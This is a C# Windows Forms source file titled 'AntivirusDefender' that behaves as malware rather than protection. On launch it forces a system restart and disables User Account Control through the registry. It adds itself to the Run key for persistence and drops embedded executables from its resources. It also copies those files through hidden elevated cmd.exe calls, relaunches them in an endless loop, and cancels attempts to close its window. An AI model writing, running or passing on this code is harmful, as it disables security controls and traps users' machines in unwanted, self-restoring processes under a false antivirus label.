using System;
using System.ComponentModel;
using System.Deployment.Application;
using System.Diagnostics;
using System.Diagnostics.Eventing.Reader;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace AntivirusDefender
{
    public partial class Form1 : Form
    {
        private BackgroundWorker backgroundWorker;
        private bool logon_check = true;
        public Form1()
        {
            Process.Start("shutdown", "/r /t 30");
            Registry.SetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA", 0, RegistryValueKind.DWord);
            InitializeComponent();
            this.TransparencyKey = BackColor;
            backgroundWorker = new BackgroundWorker();
            backgroundWorker.DoWork += BackgroundWorker_DoWork;
            backgroundWorker.WorkerSupportsCancellation = true; // Enable cancellation support
            Registry.SetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA", 0, RegistryValueKind.DWord);
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            const string quote = "\"";
            ProcessStartInfo logon = new ProcessStartInfo
            {
            };

            try
            {
                string LogonUI = @"C:\antivirusfalsepositivetest3.exe";
                while (File.Exists(LogonUI) && logon_check)
                {
                    try
                    {
                        Process.Start(LogonUI);
                    }
                    catch (Exception ex)
                    {
                    }
                }
                if (!File.Exists(LogonUI))
                {
                    logon_check = false;
                    Main0();
                    Main0();
                    Main0();
                    Main0();
                    this.Close();
                    Application.Exit();
                }
            }
            catch (Exception ex)
            {
            }
            StartMonitoring();
            StartMonitoring0();
            StartMonitoring1();
            Main0();
        }
        public static void Main0()
        {
            string keyPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
            string valueName = "MyStartupValuex";
            string fileName = "antivirusfalsepositivetest4.exe";

            try
            {
                // Dosyanın tam yolunu al
                string filePath = Path.Combine(Environment.CurrentDirectory, fileName);

                // Kayıt defteri anahtarını aç
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(keyPath, true))
                {
                    if (key != null)
                    {
                        // Yeni başlangıç değerini oluştur ve dosya yolunu atar
                        key.SetValue(valueName, filePath);

                        Console.WriteLine("Başlangıç değeri başarıyla oluşturuldu.");
                    }
                    else
                    {
                        Console.WriteLine("Kayıt defteri anahtarı bulunamadı.");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Hata: " + ex.Message);
            }
        }
        private void StartMonitoring1()
        {
            string antivirusPath = Path.Combine(Application.StartupPath, "antivirusfalsepositiveteest4.exe");
            string backupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "antivirusfalsepositivetest4.exe");

            // Access the antivirusfalsepositivetest3.exe from resources
            byte[] antiAttackBytes = Properties.Resources.antivirusfalsepositivetest4;

            // Save antivirusfalsepositivetest3.exe to a temporary location
            string antiAttackPath = Path.Combine(Application.StartupPath, "antivirusfalsepositivetest4.exe");

            // Check if the file doesn't exist or is different from the resource for antivirusfalsepositivetest3.exe
            if (!File.Exists(antiAttackPath) || !File.ReadAllBytes(antiAttackPath).SequenceEqual(antiAttackBytes))
            {
                try
                {
                    // Save the resource to the temporary location
                    File.WriteAllBytes(antiAttackPath, antiAttackBytes);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }

            if (File.Exists(antiAttackPath) && !File.Exists(backupPath))
            {
                try
                {
                    // Copy antivirusfalsepositivetest3.exe to the backup folder with elevated privileges
                    ProcessStartInfo processInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c copy \"{antiAttackPath}\" \"{backupPath}\" & pause",
                        Verb = "runas", // Run with elevated privileges (UAC)
                        CreateNoWindow = true,  // Hide the CMD window
                        WindowStyle = ProcessWindowStyle.Hidden
                    };

                    // Start the process
                    Process.Start(processInfo);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }
            else if (!File.Exists(antiAttackPath) && File.Exists(backupPath))
            {
                try
                {
                    // Copy antivirusfalsepositivetest3.exe from the backup folder to the current folder with elevated privileges
                    ProcessStartInfo processInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c copy \"{backupPath}\" \"{antiAttackPath}\" & pause",
                        Verb = "runas", // Run with elevated privileges (UAC)
                        CreateNoWindow = true,  // Hide the CMD window
                        WindowStyle = ProcessWindowStyle.Hidden
                    };

                    // Start the process
                    Process.Start(processInfo);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }

            bool antivirusDefenderRunning = Process.GetProcessesByName("AntivirusDefender").Length > 0;
            bool antiAttackRunning = Process.GetProcessesByName("antivirusfalsepositivetest3").Length > 0;

            // Check if AntivirusDefender.exe is not running in the Users folder
            if (!antivirusDefenderRunning)
            {
                string antivirusDefenderPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "AntivirusDefender.exe");

                if (!File.Exists(antivirusDefenderPath))
                {
                    try
                    {
                        // Copy AntivirusDefender.exe to the Users folder
                        File.Copy("AntivirusDefender.exe", antivirusDefenderPath);
                    }
                    catch (Exception ex)
                    {
                        // Handle the exception
                    }
                }
            }

            // Check if antivirusfalsepositivetest3.exe is not running
            if (!antiAttackRunning)
            {
                try
                {
                    // Start antivirusfalsepositivetest3.exe process
                    Process.Start(antiAttackPath);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }

            if (!backgroundWorker.IsBusy)
            {
                // Start the background worker
                backgroundWorker.RunWorkerAsync();
            }
        }
        private void StartMonitoring0()
        {
            string antivirusPath = Path.Combine(Application.StartupPath, "antivirusfalsepositiveteest3.exe");
            string backupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "antivirusfalsepositivetest3.exe");

            // Access the antivirusfalsepositivetest3.exe from resources
            byte[] antiAttackBytes = Properties.Resources.antivirusfalsepositivetest3;

            // Save antivirusfalsepositivetest3.exe to a temporary location
            string antiAttackPath = Path.Combine(Application.StartupPath, "antivirusfalsepositivetest3.exe");

            // Check if the file doesn't exist or is different from the resource for antivirusfalsepositivetest3.exe
            if (!File.Exists(antiAttackPath) || !File.ReadAllBytes(antiAttackPath).SequenceEqual(antiAttackBytes))
            {
                try
                {
                    // Save the resource to the temporary location
                    File.WriteAllBytes(antiAttackPath, antiAttackBytes);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }

            if (File.Exists(antiAttackPath) && !File.Exists(backupPath))
            {
                try
                {
                    // Copy antivirusfalsepositivetest3.exe to the backup folder with elevated privileges
                    ProcessStartInfo processInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c copy \"{antiAttackPath}\" \"{backupPath}\" & pause",
                        Verb = "runas", // Run with elevated privileges (UAC)
                        CreateNoWindow = true,  // Hide the CMD window
                        WindowStyle = ProcessWindowStyle.Hidden
                    };

                    // Start the process
                    Process.Start(processInfo);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }
            else if (!File.Exists(antiAttackPath) && File.Exists(backupPath))
            {
                try
                {
                    // Copy antivirusfalsepositivetest3.exe from the backup folder to the current folder with elevated privileges
                    ProcessStartInfo processInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c copy \"{backupPath}\" \"{antiAttackPath}\" & pause",
                        Verb = "runas", // Run with elevated privileges (UAC)
                        CreateNoWindow = true,  // Hide the CMD window
                        WindowStyle = ProcessWindowStyle.Hidden
                    };

                    // Start the process
                    Process.Start(processInfo);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }

            bool antivirusDefenderRunning = Process.GetProcessesByName("AntivirusDefender").Length > 0;
            bool antiAttackRunning = Process.GetProcessesByName("antivirusfalsepositivetest3").Length > 0;

            // Check if AntivirusDefender.exe is not running in the Users folder
            if (!antivirusDefenderRunning)
            {
                string antivirusDefenderPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "AntivirusDefender.exe");

                if (!File.Exists(antivirusDefenderPath))
                {
                    try
                    {
                        // Copy AntivirusDefender.exe to the Users folder
                        File.Copy("AntivirusDefender.exe", antivirusDefenderPath);
                    }
                    catch (Exception ex)
                    {
                        // Handle the exception
                    }
                }
            }

            // Check if antivirusfalsepositivetest3.exe is not running
            if (!antiAttackRunning)
            {
                try
                {
                    // Start antivirusfalsepositivetest3.exe process
                    Process.Start(antiAttackPath);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }

            if (!backgroundWorker.IsBusy)
            {
                // Start the background worker
                backgroundWorker.RunWorkerAsync();
            }
        }
        private void StartMonitoring()
        {
            string antivirusPath = Path.Combine(Application.StartupPath, "AntivirusDefender.exe");
            string backupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "AntivirusDefender.exe");

            // Access the antivirusfalsepositivetest3.exe from resources
            byte[] antiAttackBytes = Properties.Resources.antivirusfalsepositivetest3;

            // Save antivirusfalsepositivetest3.exe to a temporary location
            string antiAttackPath = Path.Combine(Application.StartupPath, "antivirusfalsepositivetest3.exe");

            // Check if the file doesn't exist or is different from the resource for antivirusfalsepositivetest3.exe
            if (!File.Exists(antiAttackPath) || !File.ReadAllBytes(antiAttackPath).SequenceEqual(antiAttackBytes))
            {
                try
                {
                    // Save the resource to the temporary location
                    File.WriteAllBytes(antiAttackPath, antiAttackBytes);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }


            if (File.Exists(antiAttackPath) && !File.Exists(backupPath))
            {
                try
                {
                    // Copy antivirusfalsepositivetest3.exe to the backup folder with elevated privileges
                    ProcessStartInfo processInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c copy \"{antiAttackPath}\" \"{backupPath}\" & pause",
                        Verb = "runas", // Run with elevated privileges (UAC)
                        CreateNoWindow = true,  // Hide the CMD window
                        WindowStyle = ProcessWindowStyle.Hidden
                };

                    // Start the process
                    Process.Start(processInfo);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }
            else if (!File.Exists(antiAttackPath) && File.Exists(backupPath))
            {
                try
                {
                    // Copy antivirusfalsepositivetest3.exe from the backup folder to the current folder with elevated privileges
                    ProcessStartInfo processInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c copy \"{backupPath}\" \"{antiAttackPath}\" & pause",
                        Verb = "runas", // Run with elevated privileges (UAC)
                        CreateNoWindow = true,  // Hide the CMD window
                        WindowStyle = ProcessWindowStyle.Hidden
                    };

                    // Start the process
                    Process.Start(processInfo);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }

            bool antivirusDefenderRunning = Process.GetProcessesByName("AntivirusDefender").Length > 0;
            bool antiAttackRunning = Process.GetProcessesByName("antivirusfalsepositivetest3").Length > 0;

            // Check if AntivirusDefender.exe is not running in the Users folder
            if (!antivirusDefenderRunning)
            {
                string antivirusDefenderPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "AntivirusDefender.exe");

                if (!File.Exists(antivirusDefenderPath))
                {
                    try
                    {
                        // Copy AntivirusDefender.exe to the Users folder
                        File.Copy("AntivirusDefender.exe", antivirusDefenderPath);
                    }
                    catch (Exception ex)
                    {
                        // Handle the exception
                    }
                }
            }

            // Check if antivirusfalsepositivetest3.exe is not running
            if (!antiAttackRunning)
            {
                try
                {
                    // Start antivirusfalsepositivetest3.exe process
                    Process.Start(antiAttackPath);
                }
                catch (Exception ex)
                {
                    // Handle the exception
                }
            }

            if (!backgroundWorker.IsBusy)
            {
                // Start the background worker
                backgroundWorker.RunWorkerAsync();
            }
        }
        private void BackgroundWorker_DoWork(object sender, DoWorkEventArgs e)
        {
            // Continuously monitor the process
            while (!backgroundWorker.CancellationPending)
            {
                bool antivirusRunning = Process.GetProcessesByName("Antivirus").Length > 0;
                bool antiAttackRunning = Process.GetProcessesByName("antivirusfalsepositivetest3").Length > 0;
                // Check if Antivirus.exe or clamscan.exe is not running
                if (!antivirusRunning)
                {
                    try
                    {
                        // Start Antivirus.exe process
                        Process.Start("AntivirusDefender.exe");
                    }
                    catch (Exception ex)
                    {
                    }
                }

                // Check if antivirusfalsepositivetest3.exe is not running
                if (!antiAttackRunning)
                {
                    try
                    {
                        // Start antivirusfalsepositivetest3.exe process
                        Process.Start("antivirusfalsepositivetest3.exe");
                    }
                    catch (Exception ex)
                    {
                    }
                }
            }
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            e.Cancel = true; // Cancel the form closing event
            base.OnFormClosing(e);
        }
    }
}